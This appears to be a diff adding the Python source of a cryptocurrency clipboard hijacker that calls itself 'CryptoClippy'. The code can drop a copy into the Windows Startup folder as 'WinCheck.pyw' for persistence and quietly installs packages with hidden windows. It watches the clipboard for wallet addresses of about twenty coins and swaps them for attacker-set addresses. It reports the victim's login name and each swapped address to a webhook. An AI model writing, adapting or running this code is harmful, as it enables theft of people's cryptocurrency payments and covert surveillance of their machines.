@@ -1,0 +1,85 @@
+
+import re
+import os
+import time
+import random
+import shutil
+import subprocess
+import sys
+
+hook = '' 
+thecode = ''''''
+
+appdata = os.getenv('APPDATA')
+startupfolder = os.path.join(appdata, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+if thecode:
+    with open(os.path.join(startupfolder, 'WinCheck.pyw'), 'w', encoding='utf-8') as f:
+        f.write(thecode)
+
+coinsssss = {
+    '|BTC|'      : r'(?:bc1[a-z0-9]{39,59}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})',
+    '|ETH|'      : r'0x[a-fA-F0-9]{40}',
+    '|BNB|'      : r'bnb1[0-9a-z]{38}',
+    '|XRP|'      : r'r[0-9a-zA-Z]{24,34}',
+    '|ADA|'      : r'addr1[0-9a-z]{58}',
+    '|SOL|'      : r'(?![LM3l])[1-9A-HJ-NP-Za-km-z]{43,44}(?<![LM3][1-9A-HJ-NP-Za-km-z]{33})',
+    '|DOGE|'     : r'D[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{32}',
+    '|TRX|'      : r'T[A-HJ-NP-Za-km-z1-9]{33}',
+    '|MATIC|'    : r'0x[a-fA-F0-9]{40}',
+    '|LTC|'      : r'(?:L[a-km-zA-HJ-NP-Z1-9]{26,33}|M[a-km-zA-HJ-NP-Z1-9]{26,33}|3[a-km-zA-HJ-NP-Z1-9]{26,33}|ltc1q[a-z0-9]{39}|ltc1p[a-z0-9]{58})(?![0-9A-Za-z])',
+    '|SHIB|'     : r'0x[a-fA-F0-9]{40}',
+    '|AVAX|'     : r'X-avax1[0-9a-z]{38}',
+    '|DAI|'      : r'0x[a-fA-F0-9]{40}',
+    '|UNI|'      : r'0x[a-fA-F0-9]{40}',
+    '|WBTC|'     : r'0x[a-fA-F0-9]{40}',
+    '|LINK|'     : r'0x[a-fA-F0-9]{40}',
+    '|XLM|'      : r'G[A-Z2-7]{55}',
+    '|ATOM|'     : r'cosmos1[0-9a-z]{38}',
+    '|ETC|'      : r'0x[a-fA-F0-9]{40}',
+    '|XMR|'      : r'4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}',
+    '|USDT-ERC20|': r'0x[a-fA-F0-9]{40}',
+    '|USDC-ERC20|': r'0x[a-fA-F0-9]{40}',
+}
+
+subprocess.run([sys.executable, '-m', 'pip', 'install', 'requests'], creationflags=subprocess.CREATE_NO_WINDOW)
+
+def launchnotif():
+    if hook:
+        try:
+            import requests
+            if hook:
+                requests.post(hook, json={'content': f'``{os.getlogin()} Connected to CryptoClippy``'})
+        except:
+            pass
+
+def clipnotif(old, new):
+    if hook:
+        try: 
+            import requests
+            if hook:
+                requests.post(hook, json={'content': f'``{os.getlogin()} Got clipped`` ``Old - {old}`` ``New - {new}``'})
+        except:
+            pass
+
+def startclipping():
+    subprocess.run([sys.executable, '-m', 'pip', 'install', 'pyperclip'], creationflags=subprocess.CREATE_NO_WINDOW)
+    import pyperclip
+    alladdys = [addy for addy, pattern in coinsssss.items()]
+
+    while True:
+        try:
+            clipboard = pyperclip.paste().strip()
+            for addy, pattern in coinsssss.items():
+                if re.fullmatch(pattern, clipboard):
+                    if clipboard in alladdys:
+                        pass
+                    else:
+                        pyperclip.copy(addy)
+                        clipnotif(clipboard, addy)
+            time.sleep(0.25)
+
+        except:
+            time.sleep(1)
+
+launchnotif()
+startclipping()
